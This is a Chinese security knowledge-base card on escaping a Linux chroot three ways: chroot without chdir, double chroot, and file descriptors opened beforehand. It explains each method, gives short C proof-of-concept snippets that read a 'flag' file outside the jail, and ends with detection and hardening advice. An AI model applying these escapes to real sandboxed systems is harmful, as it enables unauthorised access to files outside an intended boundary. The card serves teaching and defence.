---
id: binary-pwn-sandbox-escape-chroot-cwd-double-chroot-fd-escape
title: chroot 不是安全边界：未 chdir、双重 chroot 与已打开文件描述符三种逃逸
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: chroot-cwd-double-chroot-fd-escape
tags:
- linux
- chroot
- sandbox-escape
- privilege-escape
- file-descriptor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T10:01:55+08:00'
  notes: 已对照原文三种chroot逃逸（未chdir、双重chroot、已打开fd）核对；方法为经典完整链路，卡内补充chroot('.')收尾；未验证点：原文无具体赛题复现。
url: /docs/binary/pwn/sandbox-escape/binary-pwn-sandbox-escape-chroot-cwd-double-chroot-fd-escape/
draft: false
kb_aliases:
- chroot 逃逸
- double chroot
- chroot cwd escape
- open fd escape
- chroot 不是安全边界
---

## 一句话结论

`chroot()` 只改变进程的根目录路径解析起点，不会改变当前工作目录，也不会关闭已经打开的文件描述符；因此“chroot 后没有 `chdir("/")`”“允许在沙箱内再次 chroot”“保留了 chroot 前打开的 fd”这三种常见写法都可以让进程访问到新根之外的文件，chroot 不能单独当作安全边界。

## 原理

- `chroot("/newroot")` 把进程的 `fs->root` 指向新目录，之后绝对路径从新根开始解析；但它**不修改 `fs->pwd`（当前工作目录）**。如果调用前 cwd 在 `/home/user`，chroot 后 cwd 仍是 `/home/user`（位于新根之外）。
- 进程访问相对路径时从 cwd 开始解析；`..` 从 cwd 的父目录继续向上，不会因为 `fs->root` 改变而停在“新根”。因此 `open("../../flag")` 可以到达 chroot 外的旧根目录。
- **双重 chroot**：即使代码随后 `chdir("/")`，如果攻击者能在新根内创建目录并再次 `chroot("a")`，而当前 cwd 仍在新根之外（或通过 `..` 到达旧根），再 `chdir("../../")` 并 `chroot(".")` 就能把根切回旧根，完成逃逸。
- **已打开 fd**：`open("/flag")` 在 chroot 前完成，返回的 fd 指向旧根中的文件；chroot 只影响后续路径解析，不影响已有 fd。`read(fd)` 仍可读原文件；目录 fd 还能 `fchdir(fd)` 后继续用相对路径访问旧根。
- 本质：chroot 是“路径命名空间”的视图变换，不是内核级隔离；它假设调用者已经清理 cwd/fd 并放弃权限，否则视图可以被绕过。

## 触发条件

- 高权限进程（root/setuid）对攻击者可影响的目录执行 `chroot()`，但没有立即 `chdir("/")`、没有关闭继承的 fd、或允许沙箱内再次调用 `chroot()`。
- 攻击者能在 chroot 前后控制 cwd、创建子目录、或让进程继承自己打开的 fd（如通过 `SCM_RIGHTS`、`pidfd_getfd`、fork 继承）。
- 目标文件对进程可读（通常 chroot 是为了限制访问，但进程仍有 root/文件权限）。

## 利用步骤

1. **未 chdir 的 chroot**：确认进程 chroot 后 cwd 仍在旧根；用相对路径向上穿越：
   ```c
   chroot("/tmp/jail");
   // 当前目录仍是 /home/user
   int fd = open("../../flag", O_RDONLY);
   read(fd, buf, sizeof(buf));
   ```
2. **双重 chroot**：在沙箱内创建目录，再次 chroot，把 cwd 移到旧根，再把根切回旧根：
   ```c
   mkdir("a", 0755);
   chroot("a");
   chdir("../../");
   chroot(".");
   // 现在根目录回到 chroot 前的旧根
   ```
3. **保留 fd**：在 chroot 前打开敏感文件/目录，chroot 后直接读：
   ```c
   int fd = open("/flag", O_RDONLY);
   chroot("/tmp/jail");
   read(fd, buf, sizeof(buf));
   ```
   目录 fd 可 `fchdir(fd)` 后用 `open("flag")` 访问旧根。
4. 若拿不到任意代码执行，只能影响 chroot 的目标路径/工作目录，也可用符号链接、`..`、挂载点等方式配合。

## PoC

```c
// 方法 1：chroot 后未 chdir，cwd 在沙箱外
chroot("/tmp/jail");
int fd = open("../../flag", O_RDONLY);
read(fd, buf, sizeof(buf));

// 方法 2：双重 chroot
mkdir("a", 0755);
chroot("a");
chdir("../../");
chroot(".");
// 根目录回到旧根

// 方法 3：chroot 前打开的 fd 仍然有效
int fd2 = open("/flag", O_RDONLY);
chroot("/tmp/jail");
read(fd2, buf, sizeof(buf));
```

## 变体与关联

- `fchdir` + 目录 fd：chroot 后 `fchdir(dirfd)` 回到旧根目录，再以相对路径访问。
- `pivot_root` 使用不当、mount namespace 未清理、`/proc/self/root` 指向旧根等，也会造成类似“根视图可绕过”。
- 关联：[[cloud-container-docker-privileged-host-disk-escape]]（容器逃逸中的挂载/根切换）、[[cloud-container-docker-cp-chroot-nss-dlopen-rce]]（chroot 辅助进程从容器 rootfs 加载库的实例）。
- 边界：如果进程在 chroot 前已 `chdir("/")`、关闭所有 fd、丢弃 root 权限并使用 `pivot_root`/user namespace，本手法不成立；现代容器通常同时使用 namespace/cgroup/seccomp，单靠 chroot 的逃逸不足以突破。

## 检测与防御

- 检测：审计 chroot 调用点，检查其后是否立即 `chdir("/")`、是否 `closefrom(3)`/设置 `O_CLOEXEC`、是否允许再次 chroot；监控进程在 chroot 后访问 `..` 密集路径或 `/proc/self/root`。
- 修复：chroot 后立刻 `chdir("/")`；关闭所有不需要的 fd；在 chroot 前丢弃权限（setuid 程序尤其如此）；不要允许沙箱内再次 chroot。
- 加固：使用 mount/user namespace、`pivot_root`、seccomp 等真正的隔离机制；chroot 只作为纵深防御的一层，不单独承担安全边界。
